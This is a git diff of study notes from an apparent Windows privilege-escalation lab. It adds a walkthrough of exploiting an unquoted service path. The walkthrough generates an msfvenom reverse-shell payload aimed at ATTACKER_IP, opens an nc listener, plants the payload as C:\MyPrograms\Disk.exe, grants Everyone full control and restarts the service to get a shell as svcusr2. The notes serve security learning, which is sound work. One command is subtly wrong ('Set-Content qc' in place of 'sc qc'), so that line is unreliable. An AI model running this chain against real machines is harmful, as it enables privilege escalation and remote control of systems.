@@ -288,8 +288,8 @@ Listening on 0.0.0.0 4445
 ```
 * Restart service (if current user has permissions).
 ```
-Set-Content stop windowsscheduler
-Set-Content start windowsscheduler
+Stop-Service -Name "windowsscheduler"
+Start-Service -Name "windowsscheduler"
 ```
 * Reverse shell with svcusr1 privileges received.
 ```
@@ -301,6 +301,88 @@ C:\Windows\system32>whoami
 wprivesc1\svcusr1
 ```
 ## Unquoted Service Paths
+* Used when unable to directly write into service executables.
+* Very particular behaviour occurs when a service is configured to point to an "unquoted" executable.
+  * Path of executable not properly quoted to account for spaces.
+```
+Set-Content qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+* Spaces on name of "Disk Sorter Enterprise" folder make command ambiguous.
+* SCM does not know what to execute.
+
+| Command | Arguement 1 | Arguement 2
+| --- | --- | ---
+| `C:\MyPrograms\Disk.exe` | `Sorter` | `Enterprise\bin\disksrs.exe`
+| `C:\MyPrograms\Disk Sorter.exe` | `Enterprise\bin\disksrs.exe` |
+| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` | |
+
+* Spaces usually used as argument seperators unless part of quoted string.
+* SCM tries to help by searching for each of the binaries in the above table order.
+* Attacker creates any of the executables searched for before the expected service executable.
+  * Forces service to run arbitary executable.
+* Most service executables installed where unprivileged users cannot write.
+  * `C:\Program Files`
+  * `C:\Program Files (x86)`
+* Some installers reduce permissions of installed folder.
+* Administrator may install service binaries in world-writable non-default path.
+* `c:\MyPrograms` inherits permissions of `C:\`.
+```
+icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+* `BUILTIN\Users` group has `(AD)` (create subdirectories) and `(WD)` (create files) privileges on folder.
+* Create `msfvenom` exe-service payload.
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+```
+* Upload payload to target.
+* Start listener to receive reverse shell.
+```
+nc -lvnp 4446
+Connection received on 10.10.175.90 50650
+```
+* Move payload to `c:\MyPrograms\Disk.exe`.
+```
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+```
+* Grant Everyone full permission on file.
+  * Ensures file can be executed by the service.
+```
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+* Restart service to execute payload.
+```
+Stop-Service -Name "disk sorter enterprise"
+Start-Service -Name "disk sorter enterprise"
+```
+* Reverse shell with svcusr2 privileges received.
+```
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+wprivesc1\svcusr2
+```
 ## Insecure Service Permissions
 
 # Abusing Dangerous Privileges
